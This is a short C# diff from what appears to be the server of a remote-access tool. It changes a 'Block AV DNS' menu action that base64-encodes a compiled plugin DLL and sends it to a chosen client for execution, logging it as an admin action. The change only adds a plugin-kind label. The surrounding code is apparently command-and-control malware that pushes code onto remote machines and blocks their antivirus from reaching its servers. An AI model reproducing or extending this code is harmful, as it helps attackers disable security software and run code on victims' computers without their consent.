@@ -109,7 +109,7 @@ internal static class FeatureContextMenu
                 if (!System.IO.File.Exists(cachePath))
                 { mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal("[!] Block AV DNS: plugin not compiled yet. Run it from Auto Tasks first.")); return; }
                 var bytes = await System.IO.File.ReadAllBytesAsync(cachePath);
-                var pkt = new Packet { Type = PacketType.PluginExec, Data = Newtonsoft.Json.JsonConvert.SerializeObject(new PluginExecData { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain" }) };
+                var pkt = new Packet { Type = PacketType.PluginExec, Data = Newtonsoft.Json.JsonConvert.SerializeObject(new PluginExecData { DllBase64 = Convert.ToBase64String(bytes), ExportName = "PluginMain", PluginKind = "block_av_dns" }) };
                 await server.SendToClient(clientId, pkt);
                 mainWindow.Dispatcher.BeginInvoke(() => ServerWindow.LogGlobal($"[ADMIN] Block AV DNS sent to {clientId}."));
             });
